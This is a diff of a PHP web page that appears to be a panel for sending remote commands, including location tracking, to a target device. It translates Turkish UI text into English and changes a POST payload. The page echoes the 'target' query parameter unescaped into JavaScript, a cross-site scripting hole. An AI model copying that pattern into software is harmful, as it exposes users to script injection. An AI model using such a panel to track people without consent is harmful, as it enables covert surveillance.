@@ -11,12 +11,12 @@ $uid_device = $_GET['target'];
 
                 <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
                 <div class="col-md-10 col-lg-offset-0">
-                    <button type="button" id="btn-update-location" name="btn-update-location" class="btn btn-default">Konumu Güncelle</button>
+                    <button type="button" id="btn-update-location" name="btn-update-location" class="btn btn-default">Update Location Info</button>
                 </div>
 
                 <div class="row"></div>
                 <br><br>
-                <legend>Lokasyon Takibi</legend>
+                <legend>Location</legend>
                 <div class="row">
 
                     <div id="location-tracker-id" style="height: 500px;"></div>
@@ -49,7 +49,7 @@ $uid_device = $_GET['target'];
 
             if (data){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "Command Sent!",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
@@ -57,7 +57,7 @@ $uid_device = $_GET['target'];
 
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "Command Failed.!",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
@@ -68,16 +68,16 @@ $uid_device = $_GET['target'];
     });
 
     $("#command-sender-id").click(function() {
-        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "location_tracker", value: true}, function( data, err ) {
+        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", command: "location_tracker"}, function( data, err ) {
             if (data.status){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "Command Sent!",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "Command Failed.!",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
